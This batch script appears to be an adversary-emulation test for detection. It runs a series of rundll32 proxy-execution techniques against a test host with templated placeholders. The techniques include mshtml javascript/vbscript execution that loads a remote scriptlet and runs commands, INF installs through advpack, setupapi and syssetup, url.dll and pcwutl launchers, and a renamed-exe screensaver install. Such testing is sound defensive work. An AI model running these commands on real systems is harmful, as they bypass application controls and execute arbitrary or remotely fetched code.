@echo off
echo "[*] Performing rundll32 tests against the test host"
timeout 5 > NUL
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();
timeout 6 > NUL
rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0) # change to notepad.exe
timeout 5 > NUL
rundll32.exe advpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
timeout 7 > NUL
rundll32.exe ieadvpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
timeout 5 > NUL
rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 .\#{inf_to_execute}
timeout 6 > NUL
rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\#{inf_to_execute}
timeout 5 > NUL
rundll32.exe url.dll,OpenURL "#{path_to_test_.hta}"
rundll32.exe URL.dll,FileProtocolHandler "#{path_to_test_.vbs}"
timeout 6 > NUL
rundll32.exe pcwutl.dll,LaunchApplication #{exe_to_launch}
timeout 6 > NUL
rundll32.exe #{input_file}, StartW
rundll32.exe #{input_file},#2
rundll32.exe shell32.dll,Control_RunDLL #{input_file}
copy #{exe_to_launch} not_an_scr.scr
rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr